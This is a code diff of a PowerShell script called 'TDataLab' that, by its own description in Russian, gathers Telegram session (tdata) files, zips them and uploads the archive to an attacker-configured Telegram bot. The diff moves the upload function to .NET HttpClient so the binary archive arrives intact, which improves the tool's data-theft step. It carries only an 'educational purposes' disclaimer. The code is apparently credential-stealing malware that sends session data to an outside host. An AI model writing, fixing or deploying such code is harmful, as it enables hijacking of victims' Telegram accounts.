@@ -1,11 +1,11 @@
 <#
 .SYNOPSIS
-    TDataLab v3.3 — Исправленная стабильная версия
+    TDataLab v3.4 — Исправленная отправка бинарных файлов
 .DESCRIPTION
     Собирает доступные файлы сессии Telegram, упаковывает в ZIP и отправляет в Telegram.
     Работает в PowerShell 5.1 и выше.
 .NOTES
-    Версия: 3.3
+    Версия: 3.4
     Только для образовательных целей.
 #>
 
@@ -36,76 +36,65 @@ function Write-Log {
     Write-Host $logEntry
 }
 
-# === ОТПРАВКА В TELEGRAM ===
+# === ОТПРАВКА В TELEGRAM (ЧЕРЕЗ HTTPCLIENT) ===
 function Send-ToTelegram {
     param([string]$FilePath, [string]$Caption = "TDataLab отчет")
 
     if (-not $script:Config.EnableUpload) {
-        Write-Log "Отправка в Telegram отключена в настройках." "INFO"
+        Write-Log "Отправка в Telegram отключена." "INFO"
         return $false
     }
-
     if ([string]::IsNullOrEmpty($script:Config.BotToken) -or $script:Config.BotToken -eq "") {
-        Write-Log "Токен бота не задан. Отправка отключена." "WARN"
+        Write-Log "Токен бота не задан." "WARN"
         return $false
     }
     if ([string]::IsNullOrEmpty($script:Config.ChatId) -or $script:Config.ChatId -eq "") {
-        Write-Log "Chat ID не задан. Отправка отключена." "WARN"
+        Write-Log "Chat ID не задан." "WARN"
         return $false
     }
 
-    Write-Log "Пытаюсь отправить файл в Telegram..." "INFO"
+    Write-Log "Отправка файла в Telegram..." "INFO"
 
     try {
-        $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"
+        # Загружаем сборки для HTTP-клиента
+        Add-Type -AssemblyName System.Net.Http
+        Add-Type -AssemblyName System.Runtime.Serialization
+        Add-Type -AssemblyName System.Net.Http.WebRequest
 
-        # Читаем файл в байты
-        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"
+        
+        # Читаем файл
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         $fileName = [System.IO.Path]::GetFileName($FilePath)
 
-        # Создаём multipart/form-data вручную (совместимо с PS5.1)
-        $boundary = "---------------------------" + (Get-Random -Maximum 99999999).ToString()
-        $LF = "`r`n"
+        # Создаём multipart/form-data через .NET HttpClient
+        $client = New-Object System.Net.Http.HttpClient
+        
+        # Создаём контент
+        $multipart = New-Object System.Net.Http.MultipartFormDataContent
+        
+        # Добавляем chat_id
+        $chatIdContent = New-Object System.Net.Http.StringContent($script:Config.ChatId)
+        $multipart.Add($chatIdContent, "chat_id")
+        
+        # Добавляем caption
+        $captionContent = New-Object System.Net.Http.StringContent($Caption)
+        $multipart.Add($captionContent, "caption")
+        
+        # Добавляем файл (бинарный)
+        $fileContent = New-Object System.Net.Http.ByteArrayContent($fileBytes)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $multipart.Add($fileContent, "document", $fileName)
 
-        $bodyLines = @()
+        # Отправляем запрос
+        $response = $client.PostAsync($uri, $multipart).Result
+        $responseContent = $response.Content.ReadAsStringAsync().Result
 
-        # Поле chat_id
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
-        $bodyLines += ""
-        $bodyLines += $script:Config.ChatId
-
-        # Поле caption
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"caption`""
-        $bodyLines += ""
-        $bodyLines += $Caption
-
-        # Поле document (файл)
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
-        $bodyLines += "Content-Type: application/zip"
-        $bodyLines += ""
-        $bodyLines += [System.Text.Encoding]::UTF8.GetString($bytes)
-
-        $bodyLines += "--$boundary--"
-        $bodyLines += ""
-
-        $body = [string]::Join($LF, $bodyLines)
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-
-        # Создаём запрос
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
-
-        $response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyBytes
-
-        if ($response.ok) {
-            Write-Log "Архив успешно отправлен в Telegram!" "INFO"
+        if ($response.IsSuccessStatusCode) {
+            Write-Log "Файл успешно отправлен в Telegram!" "INFO"
             return $true
         } else {
-            Write-Log "Ошибка Telegram: $($response.description)" "ERROR"
+            Write-Log "Ошибка Telegram: $($response.StatusCode) - $responseContent" "ERROR"
             return $false
         }
     } catch {
@@ -190,7 +179,7 @@ function Cleanup {
 # === ГЛАВНЫЙ ПРОЦЕСС ===
 function Start-TDataLab {
     Write-Log "=========================================" "INFO"
-    Write-Log "TDataLab v3.3 запущен." "INFO"
+    Write-Log "TDataLab v3.4 запущен." "INFO"
     Write-Log "=========================================" "INFO"
 
     $tdataPath = $script:Config.TDataPath
